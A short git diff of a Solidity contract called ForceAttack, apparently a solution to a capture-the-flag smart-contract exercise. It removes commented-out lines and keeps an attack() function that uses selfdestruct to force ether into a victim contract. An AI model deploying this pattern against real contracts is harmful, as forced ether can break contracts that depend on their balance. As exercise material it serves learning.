@@ -14,9 +14,6 @@ contract ForceAttack {
 
   function attack() public payable {
     require (msg.value > 0, "send some eth");
-    // (bool success,) = payable(address(victimContract)).call{value: _value}("");
-    // address payable addr = payable(address(victimContract))
-    // return success;
     selfdestruct(payable(address(victimContract)));
   }
 }
